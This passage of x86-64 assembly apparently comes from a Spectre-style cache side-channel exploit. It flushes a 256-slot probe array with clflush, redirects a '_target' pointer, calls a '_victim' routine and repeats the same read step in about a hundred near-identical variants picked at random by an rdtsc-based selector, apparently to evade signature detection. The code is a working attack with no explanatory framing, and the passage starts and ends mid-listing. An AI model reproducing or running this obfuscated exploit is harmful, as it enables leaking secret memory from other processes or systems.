	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 3
.LreadByte_win5_var3:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 4
.LreadByte_win5_var4:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 5
.LreadByte_win5_var5:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 6
.LreadByte_win5_var6:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 7
.LreadByte_win5_var7:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 8
.LreadByte_win5_var8:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 9
.LreadByte_win5_var9:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 10
.LreadByte_win5_var10:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 11
.LreadByte_win5_var11:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 12
.LreadByte_win5_var12:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 13
.LreadByte_win5_var13:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 14
.LreadByte_win5_var14:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 15
.LreadByte_win5_var15:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 16
.LreadByte_win5_var16:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 17
.LreadByte_win5_var17:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 18
.LreadByte_win5_var18:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 19
.LreadByte_win5_var19:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 20
.LreadByte_win5_var20:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 21
.LreadByte_win5_var21:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 22
.LreadByte_win5_var22:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 23
.LreadByte_win5_var23:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 24
.LreadByte_win5_var24:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 25
.LreadByte_win5_var25:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 26
.LreadByte_win5_var26:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 27
.LreadByte_win5_var27:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 28
.LreadByte_win5_var28:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 29
.LreadByte_win5_var29:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 30
.LreadByte_win5_var30:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 31
.LreadByte_win5_var31:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 32
.LreadByte_win5_var32:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 33
.LreadByte_win5_var33:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 34
.LreadByte_win5_var34:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 35
.LreadByte_win5_var35:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 36
.LreadByte_win5_var36:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 37
.LreadByte_win5_var37:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 38
.LreadByte_win5_var38:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 39
.LreadByte_win5_var39:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 40
.LreadByte_win5_var40:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 41
.LreadByte_win5_var41:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 42
.LreadByte_win5_var42:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 43
.LreadByte_win5_var43:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 44
.LreadByte_win5_var44:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 45
.LreadByte_win5_var45:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 46
.LreadByte_win5_var46:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 47
.LreadByte_win5_var47:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 48
.LreadByte_win5_var48:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 49
.LreadByte_win5_var49:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 50
.LreadByte_win5_var50:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 51
.LreadByte_win5_var51:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 52
.LreadByte_win5_var52:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 53
.LreadByte_win5_var53:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 54
.LreadByte_win5_var54:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 55
.LreadByte_win5_var55:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 56
.LreadByte_win5_var56:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 57
.LreadByte_win5_var57:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 58
.LreadByte_win5_var58:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 59
.LreadByte_win5_var59:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 60
.LreadByte_win5_var60:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 61
.LreadByte_win5_var61:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 62
.LreadByte_win5_var62:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 63
.LreadByte_win5_var63:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 64
.LreadByte_win5_var64:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 65
.LreadByte_win5_var65:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 66
.LreadByte_win5_var66:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 67
.LreadByte_win5_var67:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 68
.LreadByte_win5_var68:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 69
.LreadByte_win5_var69:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 70
.LreadByte_win5_var70:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 71
.LreadByte_win5_var71:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 72
.LreadByte_win5_var72:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 73
.LreadByte_win5_var73:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 74
.LreadByte_win5_var74:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 75
.LreadByte_win5_var75:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 76
.LreadByte_win5_var76:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 77
.LreadByte_win5_var77:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 78
.LreadByte_win5_var78:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 79
.LreadByte_win5_var79:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 80
.LreadByte_win5_var80:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 81
.LreadByte_win5_var81:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 82
.LreadByte_win5_var82:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 83
.LreadByte_win5_var83:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 84
.LreadByte_win5_var84:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 85
.LreadByte_win5_var85:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 86
.LreadByte_win5_var86:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 87
.LreadByte_win5_var87:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 88
.LreadByte_win5_var88:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 89
.LreadByte_win5_var89:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 90
.LreadByte_win5_var90:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 91
.LreadByte_win5_var91:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 92
.LreadByte_win5_var92:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 93
.LreadByte_win5_var93:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 94
.LreadByte_win5_var94:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 95
.LreadByte_win5_var95:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 96
.LreadByte_win5_var96:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 97
.LreadByte_win5_var97:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 98
.LreadByte_win5_var98:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 99
.LreadByte_win5_var99:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
.LreadByte_win5_continue:
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.13:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_11
LBB3_14:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_safe_target(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	clflush	(%rax)
	mfence
	movq	-1048(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	movl	$0, -1072(%rbp)
LBB3_15:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadByte_win4_var0
	cmpl	$1, %eax
	je	.LreadByte_win4_var1
	cmpl	$2, %eax
	je	.LreadByte_win4_var2
	cmpl	$3, %eax
	je	.LreadByte_win4_var3
	cmpl	$4, %eax
	je	.LreadByte_win4_var4
	cmpl	$5, %eax
	je	.LreadByte_win4_var5
	cmpl	$6, %eax
	je	.LreadByte_win4_var6
	cmpl	$7, %eax
	je	.LreadByte_win4_var7
	cmpl	$8, %eax
	je	.LreadByte_win4_var8
	cmpl	$9, %eax
	je	.LreadByte_win4_var9
	cmpl	$10, %eax
	je	.LreadByte_win4_var10
	cmpl	$11, %eax
	je	.LreadByte_win4_var11
	cmpl	$12, %eax
	je	.LreadByte_win4_var12
	cmpl	$13, %eax
	je	.LreadByte_win4_var13
	cmpl	$14, %eax
	je	.LreadByte_win4_var14
	cmpl	$15, %eax
	je	.LreadByte_win4_var15
	cmpl	$16, %eax
	je	.LreadByte_win4_var16
	cmpl	$17, %eax
	je	.LreadByte_win4_var17
	cmpl	$18, %eax
	je	.LreadByte_win4_var18
	cmpl	$19, %eax
	je	.LreadByte_win4_var19
	cmpl	$20, %eax
	je	.LreadByte_win4_var20
	cmpl	$21, %eax
	je	.LreadByte_win4_var21
	cmpl	$22, %eax
	je	.LreadByte_win4_var22
	cmpl	$23, %eax
	je	.LreadByte_win4_var23
	cmpl	$24, %eax
	je	.LreadByte_win4_var24
	cmpl	$25, %eax
	je	.LreadByte_win4_var25
	cmpl	$26, %eax
	je	.LreadByte_win4_var26
	cmpl	$27, %eax
	je	.LreadByte_win4_var27
	cmpl	$28, %eax
	je	.LreadByte_win4_var28
	cmpl	$29, %eax
	je	.LreadByte_win4_var29
	cmpl	$30, %eax
	je	.LreadByte_win4_var30
	cmpl	$31, %eax
	je	.LreadByte_win4_var31
	cmpl	$32, %eax
	je	.LreadByte_win4_var32
	cmpl	$33, %eax
	je	.LreadByte_win4_var33
	cmpl	$34, %eax
	je	.LreadByte_win4_var34
	cmpl	$35, %eax
	je	.LreadByte_win4_var35
	cmpl	$36, %eax
	je	.LreadByte_win4_var36
